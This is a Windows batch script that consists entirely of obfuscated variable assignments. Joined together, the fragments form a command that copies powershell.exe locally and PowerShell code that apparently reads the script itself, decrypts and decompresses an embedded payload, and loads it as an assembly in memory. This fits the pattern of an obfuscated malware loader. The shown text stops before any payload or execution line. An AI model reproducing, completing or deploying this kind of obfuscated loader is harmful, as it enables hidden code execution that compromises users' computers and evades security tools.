@echo off
set "XhdwuvgdJw=nd"
set "mkhwtnjXat=do"
set "sfnyqFzZLL=xe"
set "PoCUkXEnLo=he"
set "RFGvdJtboD=in"
set "sAUTiOZPMr= /"
set "KzKxOdVHsv=32"
set "zARxiSKHsm=s\"
set "iYCgaxqFnC=em"
set "QiFgiKZIPZ= C"
set "soGUKeSouf=Po"
set "yUFoGFpwVY=po"
set "HVhpbDQvYd=Sy"
set "RXxYNWcdAA=Wi"
set "gUCEzGcxOt=ll"
set "IfeUNqlCBL=he"
set "wgbFAyTbxm=rS"
set "LDTzcEdvEo=we"
set "KTRtzUWflx=:\"
set "ZdWtYQNdBu=ow"
set "lQRhqvqyDk=1."
set "KTsOiOkJes=we"
set "GkZgYlmaul=\v"
set "JBulYKmjix=rs"
set "ZrfxGFecZt=\W"
set "xhCHQWAtpV=.e"
set "EMjRgZLMsJ=co"
set "KFwbowGcUa=py"
set "NTvPxOaeaX=st"
set "HPvOZADwdR=y "
set "uUDUJaaYwj=ll"
set "TtMFXQTezu=ws"
set "kWXQXBDgWz=0\"
set "hRhAJYisUc=cd"
set "iPNJzsLwBh= %~dp0"
set "EZxpSRoJuJ=d = "
set "OHIAwqAVpY=[-1."
set "YdbRouzRdS=V = "
set "ROXwHyOkJS=C = "
set "hwdbdfjMwt=kXwl"
set "dtEucBaPWx=ct S"
set "CDCmkwiGKL=('Tg"
set "fkoJKNzses=ateD"
set "rzmzbewdAU=.Cry"
set "kEdPtPpagZ=;$Bz"
set "dEXzcWhFEm=U.Su"
set "znpkFBwwdd=.Dis"
set "NuCzHrOzER=JQHx"
set "SBXXKtIItO=; };"
set "dxOmPppKNb=YxVw"
set "rutwlLjvIz=tem."
set "VFhiHXXyWT=Disp"
set "xRAbsXEnpC=C = "
set "fdFDkWqlTC=eam("
set "PyebYMwKmW=]::N"
set "HBBQiQVFDl=$zYm"
set "xprsywdInq=ay()"
set "cHaomEFfyR= New"
set "MSIiwQXfpg=Xwl."
set "xjwlcOblGO=oArr"
set "urfqgaQuVJ=LD.T"
set "UvmfxnAeyo=saBm"
set "nMaQurudaG=pose"
set "vUMUIHnltk=16] "
set "AInJlqTvzL== $z"
set "nBxFILjoIe=n ''"
set "QkeStFUkkF='gni"
set "hvAbZNKgyT== [S"
set "zhatpZwDSO=$DDv"
set "avurvyyUkj=:('g"
set "ptRDDSYULi=nirt"
set "dSKuXqPqbf=.Mod"
set "cRLiLJyrAw=F'[-"
set "TkjGJxLmdR=;$je"
set "ChGVUZIyyb=.Con"
set "liiDQOWsWU=embl"
set "ciFatisgoe=ptor"
set "snOrVhWANY=join"
set "TtfgSfFGDj=ispo"
set "oXGHObfIfI=Disp"
set "cBWIUQmRSi=W.En"
set "iKXWAxnPbl=ionM"
set "wJVybwnVCt=S46e"
set "ZlyxlXVwIa=m(, "
set "WGcCfaUeBs=ring"
set "mBFizRLSnw=DDvr"
set "MzqMbEPbIK=106u"
set "GKcmqwFjAi=wLD "
set "WGvmbNGyHG=ose("
set "hvbZCNfWtl=eMVs"
set "rJjUIomrlZ=J.Pa"
set "IHjcBRkirF= '')"
set "sQSTvDvFSm=-joi"
set "kCrQoUhLgp=.-16"
set "cxoPIModEA=DDvr"
set "gpSCKuyZPX=.Key"
set "yIlnVtADhY=y.Pa"
set "ASuLdooOOQ=trea"
set "jXVWLjcJHU=pose"
set "PuwpIsIwYz=ddin"
set "JXmkPzhAak=sw);"
set "mHTAKQUfne=$GgX"
set "PqkwoesiYs=[]] "
set "fuWOhkXTbC=.Cop"
set "nNaEsHbABa=Bp ="
set "sPqjpcrcyB=('%~f0'"
set "wKNAZGoTbp=zuZI"
set "hbNOuDtmUg=fOW "
set "XPIalVlIdv=Bmor"
set "vMcqIpAXvG=;$je"
set "LvIEJzqooD=[Sys"
set "CfEbgwPVYx=em.C"
set "wocpAXcnZx=New-"
